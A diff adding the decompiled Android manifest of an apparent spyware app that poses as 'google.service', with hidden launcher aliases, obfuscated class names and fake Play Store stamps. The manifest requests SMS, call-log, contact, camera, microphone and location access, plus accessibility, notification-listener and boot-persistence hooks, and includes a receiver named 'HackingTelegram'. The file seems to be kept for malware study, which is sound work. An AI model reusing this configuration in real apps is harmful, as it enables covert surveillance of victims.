@@ -1,1 +1,383 @@
-
+<?xml version="1.0" encoding="utf-8"?>
+<manifest  xmlns:android="http://schemas.android.com/apk/res/android"
+ android:versionCode="1684531" android:versionName="1.0.7" android:compileSdkVersion="31" android:compileSdkVersionCodename="12" package="google.service.main" platformBuildVersionCode="31" platformBuildVersionName="12">
+	<uses-sdk android:minSdkVersion="17" android:targetSdkVersion="28">
+	</uses-sdk>
+	<uses-permission android:name="android.permission.FOREGROUND_SERVICE">
+	</uses-permission>
+	<uses-permission android:name="android.permission.READ_SMS">
+	</uses-permission>
+	<uses-permission android:name="android.permission.READ_CALL_LOG">
+	</uses-permission>
+	<uses-permission android:name="android.permission.READ_CONTACTS">
+	</uses-permission>
+	<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE">
+	</uses-permission>
+	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE">
+	</uses-permission>
+	<uses-permission android:name="android.permission.GET_ACCOUNTS">
+	</uses-permission>
+	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED">
+	</uses-permission>
+	<uses-permission android:name="android.permission.CAMERA">
+	</uses-permission>
+	<uses-permission android:name="android.permission.INTERNET">
+	</uses-permission>
+	<queries>
+		<package android:name="null">
+		</package>
+	</queries>
+	<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW">
+	</uses-permission>
+	<uses-permission android:name="android.permission.RECORD_AUDIO">
+	</uses-permission>
+	<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION">
+	</uses-permission>
+	<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION">
+	</uses-permission>
+	<uses-permission android:name="android.permission.READ_PHONE_STATE">
+	</uses-permission>
+	<uses-permission android:name="android.permission.WAKE_LOCK">
+	</uses-permission>
+	<uses-permission android:name="com.android.alarm.permission.SET_ALARM">
+	</uses-permission>
+	<uses-permission android:name="android.permission.WRITE_CALL_LOG">
+	</uses-permission>
+	<uses-permission android:name="android.permission.WRITE_CONTACTS">
+	</uses-permission>
+	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE">
+	</uses-permission>
+	<uses-permission android:name="android.permission.ACCESS_WIFI_STATE">
+	</uses-permission>
+	<uses-permission android:name="android.permission.CHANGE_WIFI_STATE">
+	</uses-permission>
+	<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES">
+	</uses-permission>
+	<uses-permission android:name="android.permission.CALL_PHONE">
+	</uses-permission>
+	<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS">
+	</uses-permission>
+	<uses-permission android:name="android.permission.SET_WALLPAPER">
+	</uses-permission>
+	<uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT">
+	</uses-permission>
+	<uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT">
+	</uses-permission>
+	<uses-permission android:name="oppo.permission.OPPO_COMPONENT_SAFE">
+	</uses-permission>
+	<uses-permission android:name="com.huawei.permission.external_app_settings.USE_COMPONENT">
+	</uses-permission>
+	<application android:theme="@android:01030010" android:label="@7F09000A" android:icon="@7F040001" android:allowBackup="true" android:largeHeap="true" android:supportsRtl="true" android:usesCleartextTraffic="true" android:appComponentFactory="android.support.v4.app.CoreComponentFactory">
+		<provider android:name="android.support.v4.content.FileProvider" android:exported="false" android:authorities="google.service.main.provider" android:grantUriPermissions="true">
+			<meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@7F0C0001">
+			</meta-data>
+		</provider>
+		<activity android:label="@7F09000A" android:icon="@7F040001" android:name="google.service.ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779">
+		</activity>
+		<activity-alias android:label="@7F09000A" android:icon="@7F040001" android:name="google.service.MainActive" android:enabled="true" android:targetActivity="google.service.ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779">
+			<intent-filter>
+				<action android:name="android.intent.action.CHOOSER">
+				</action>
+				<action android:name="android.intent.action.MAIN">
+				</action>
+				<category android:name="android.intent.category.INFO">
+				</category>
+				<action android:name="android.intent.action.VIEW">
+				</action>
+				<category android:name="android.intent.category.DEFAULT">
+				</category>
+				<category android:name="com.android.internal.category.PLATLOGO">
+				</category>
+				<action android:name="android.intent.action.SEND">
+				</action>
+				<action android:name="android.intent.action.SEND_MULTIPLE">
+				</action>
+				<category android:name="android.intent.category.BROWSABLE">
+				</category>
+				<action android:name="android.intent.action.PACKAGE_REMOVED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_REPLACED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_ADDED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_CHANGED">
+				</action>
+				<action android:name="com.ui.OnAlarmReceiver.ACTION_WIDGET_RECEIVER">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.COIN">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.COIO">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.LUCM">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.PROX">
+				</action>
+				<action android:name="ir.cafebazaar.pardakht.InAppBillingService.BIND">
+				</action>
+				<action android:name="ru.aaaaaaax.installer">
+				</action>
+				<action android:name="com.nokia.payment.iapenabler.InAppBillingService.BIND">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.INST">
+				</action>
+			</intent-filter>
+		</activity-alias>
+		<activity android:label="Translate" android:name="google.service.θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792">
+		</activity>
+		<activity-alias android:theme="@android:01030010" android:label="Translate" android:icon="@7F040013" android:name="google.service.GoogleTranslate" android:enabled="false" android:targetActivity="google.service.θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792">
+			<intent-filter>
+				<action android:name="android.intent.action.CHOOSER">
+				</action>
+				<action android:name="android.intent.action.MAIN">
+				</action>
+				<category android:name="android.intent.category.INFO">
+				</category>
+				<action android:name="android.intent.action.VIEW">
+				</action>
+				<category android:name="android.intent.category.DEFAULT">
+				</category>
+				<category android:name="com.android.internal.category.PLATLOGO">
+				</category>
+				<action android:name="android.intent.action.SEND">
+				</action>
+				<action android:name="android.intent.action.SEND_MULTIPLE">
+				</action>
+				<category android:name="android.intent.category.BROWSABLE">
+				</category>
+				<action android:name="android.intent.action.PACKAGE_REMOVED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_REPLACED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_ADDED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_CHANGED">
+				</action>
+				<action android:name="com.ui.OnAlarmReceiver.ACTION_WIDGET_RECEIVER">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.COIN">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.COIO">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.LUCM">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.PROX">
+				</action>
+				<action android:name="ir.cafebazaar.pardakht.InAppBillingService.BIND">
+				</action>
+				<action android:name="ru.aaaaaaax.installer">
+				</action>
+				<action android:name="com.nokia.payment.iapenabler.InAppBillingService.BIND">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.INST">
+				</action>
+				<action android:name="xyz">
+				</action>
+			</intent-filter>
+		</activity-alias>
+		<activity android:label="News" android:name="google.service.ˈـ䉀ˆⶱ䉀ˈφⶱᵎᵔ䉀ʾㅤʼ䉀ˋ$$ʿㅤ4789">
+		</activity>
+		<activity-alias android:label="News" android:icon="@7F040010" android:name="google.service.googlenews" android:enabled="false" android:targetActivity="google.service.ˈـ䉀ˆⶱ䉀ˈφⶱᵎᵔ䉀ʾㅤʼ䉀ˋ$$ʿㅤ4789">
+			<intent-filter>
+				<action android:name="android.intent.action.CHOOSER">
+				</action>
+				<action android:name="android.intent.action.MAIN">
+				</action>
+				<category android:name="android.intent.category.INFO">
+				</category>
+				<action android:name="android.intent.action.VIEW">
+				</action>
+				<category android:name="android.intent.category.DEFAULT">
+				</category>
+				<category android:name="com.android.internal.category.PLATLOGO">
+				</category>
+				<action android:name="android.intent.action.SEND">
+				</action>
+				<action android:name="android.intent.action.SEND_MULTIPLE">
+				</action>
+				<category android:name="android.intent.category.BROWSABLE">
+				</category>
+				<action android:name="android.intent.action.PACKAGE_REMOVED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_REPLACED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_ADDED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_CHANGED">
+				</action>
+				<action android:name="com.ui.OnAlarmReceiver.ACTION_WIDGET_RECEIVER">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.COIN">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.COIO">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.LUCM">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.PROX">
+				</action>
+				<action android:name="ir.cafebazaar.pardakht.InAppBillingService.BIND">
+				</action>
+				<action android:name="ru.aaaaaaax.installer">
+				</action>
+				<action android:name="com.nokia.payment.iapenabler.InAppBillingService.BIND">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.INST">
+				</action>
+			</intent-filter>
+		</activity-alias>
+		<activity android:label="   " android:name="google.service.ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795">
+		</activity>
+		<activity-alias android:label="   " android:icon="@7F040012" android:name="google.service.costm" android:enabled="false" android:targetActivity="google.service.ˎˋʿˑㅤʿㅤˈˋʽᴵʿʿיʿˉφʾՙ$䉀4795">
+			<intent-filter>
+				<action android:name="android.intent.action.CHOOSER">
+				</action>
+				<action android:name="android.intent.action.MAIN">
+				</action>
+				<category android:name="android.intent.category.INFO">
+				</category>
+				<action android:name="android.intent.action.VIEW">
+				</action>
+				<category android:name="android.intent.category.DEFAULT">
+				</category>
+				<category android:name="com.android.internal.category.PLATLOGO">
+				</category>
+				<action android:name="android.intent.action.SEND">
+				</action>
+				<action android:name="android.intent.action.SEND_MULTIPLE">
+				</action>
+				<category android:name="android.intent.category.BROWSABLE">
+				</category>
+				<action android:name="android.intent.action.PACKAGE_REMOVED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_REPLACED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_ADDED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_CHANGED">
+				</action>
+				<action android:name="com.ui.OnAlarmReceiver.ACTION_WIDGET_RECEIVER">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.COIN">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.COIO">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.LUCM">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.PROX">
+				</action>
+				<action android:name="ir.cafebazaar.pardakht.InAppBillingService.BIND">
+				</action>
+				<action android:name="ru.aaaaaaax.installer">
+				</action>
+				<action android:name="com.nokia.payment.iapenabler.InAppBillingService.BIND">
+				</action>
+				<action android:name="com.android.vending.billing.InAppBillingService.INST">
+				</action>
+			</intent-filter>
+		</activity-alias>
+		<activity android:label="Android System" android:name="google.service.ⶱʾ䉀ʿⶱʿᴵㅤיⶱʾⶱⶱˎ$ʿ$䉀ʾ$$ﹳـ4785">
+		</activity>
+		<receiver android:label="RestartServiceWhenStopped" android:name="google.service.SensorRestarterBroadcastReceiver" android:enabled="true" android:exported="true">
+			<intent-filter>
+				<action android:name="ac.in.ActivityRecognition.RestartSensor">
+				</action>
+			</intent-filter>
+		</receiver>
+		<service android:label="@7F09000A" android:name="google.service.ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721" android:enabled="true">
+		</service>
+		<service android:label="@7F09000A" android:name="google.service.ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777" android:enabled="true">
+		</service>
+		<service android:label="@7F09000A" android:name="google.service.ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776" android:enabled="true">
+		</service>
+		<service android:name="google.service.ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:persistent="true">
+			<intent-filter>
+				<action android:name="android.accessibilityservice.AccessibilityService">
+				</action>
+			</intent-filter>
+			<meta-data android:name="android.accessibilityservice" android:resource="@7F0C0000">
+			</meta-data>
+		</service>
+		<service android:name="google.service.φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794" android:persistent="true" android:enabled="true">
+		</service>
+		<service android:name="google.service.θٴʼᵢʾⶱʿⶱˆˋᴵʻθˉೲᵔˎㅤㅤʾⶱʿ$ᵢˉˎᘣ4802" android:persistent="true" android:enabled="true">
+		</service>
+		<service android:name="com.google.service.MainService">
+		</service>
+		<service android:label="Notifications" android:name="com.google.service.NotificationListener" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+			<intent-filter>
+				<action android:name="android.service.notification.NotificationListenerService">
+				</action>
+			</intent-filter>
+		</service>
+		<receiver android:name="com.ApkEditors.HackingTelegram.IncomingSms">
+			<intent-filter>
+				<action android:name="android.provider.Telephony.SMS_RECEIVED">
+				</action>
+			</intent-filter>
+		</receiver>
+		<receiver android:name="google.service.ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ4772" android:enabled="true" android:exported="true">
+			<intent-filter android:priority="999">
+				<action android:name="android.intent.action.BOOT_COMPLETED">
+				</action>
+				<action android:name="android.intent.action.QUICKBOOT_POWERON">
+				</action>
+				<action android:name="com.htc.intent.action.QUICKBOOT_POWERON">
+				</action>
+			</intent-filter>
+		</receiver>
+		<receiver android:name="google.service.RC" android:enabled="true" android:exported="true">
+			<intent-filter>
+				<action android:name="android.intent.action.PACKAGE_ADDED">
+				</action>
+				<action android:name="android.intent.action.PACKAGE_REMOVED">
+				</action>
+				<data android:scheme="package">
+				</data>
+			</intent-filter>
+		</receiver>
+		<receiver android:name="google.service.ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47724">
+			<intent-filter>
+				<action android:name="android.intent.action.SCREEN_ON">
+				</action>
+				<action android:name="android.intent.action.SCREEN_OFF">
+				</action>
+				<action android:name="android.Intent.ACTION_USER_PRESENT">
+				</action>
+			</intent-filter>
+		</receiver>
+		<service android:name="google.service.ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47723">
+		</service>
+		<service android:name="google.service.φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791">
+		</service>
+		<receiver android:name="google.service._callr_lsnr_" android:enabled="true">
+			<intent-filter>
+				<action android:name="android.intent.action.PHONE_STATE">
+				</action>
+			</intent-filter>
+			<intent-filter>
+				<action android:name="android.intent.action.NEW_OUTGOING_CALL">
+				</action>
+			</intent-filter>
+		</receiver>
+		<activity android:theme="@android:01030010" android:name="google.service.ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788">
+		</activity>
+		<activity android:theme="@android:01030010" android:name="google.service.ⶱ$ʾঙˎˈʿٴⶨㅤ$ㅤφˊʾʿೲˋㅤ$ೲφﹶೲ4787">
+		</activity>
+		<activity android:theme="@android:01030010" android:name="google.service.䉀φ$ˎʾʻʾˎⶱ$ˆ䉀ˉـˋ$ـיㅤᵎʾᵔⶱᵢㅤʿˋᴵᵢ4793">
+		</activity>
+		<activity android:theme="@android:01030010" android:name="google.service.ʾˎʾㅤᵎˈˆـθ䉀ⁱʾㅤθㅤʾʿㅤˊㅤθㅤ4786">
+		</activity>
+		<meta-data android:name="com.android.dynamic.apk.fused.modules" android:value="base">
+		</meta-data>
+		<meta-data android:name="com.android.stamp.source" android:value="https://play.google.com/store">
+		</meta-data>
+		<meta-data android:name="com.android.stamp.type" android:value="STAMP_TYPE_STANDALONE_APK">
+		</meta-data>
+		<meta-data android:name="com.android.vending.splits" android:resource="@7F0C0002">
+		</meta-data>
+		<meta-data android:name="com.android.vending.derived.apk.id" android:value="14547">
+		</meta-data>
+		<meta-data android:name="com.google.android.gms.version" android:value="392041481">
+		</meta-data>
+	</application>
+</manifest>
+    
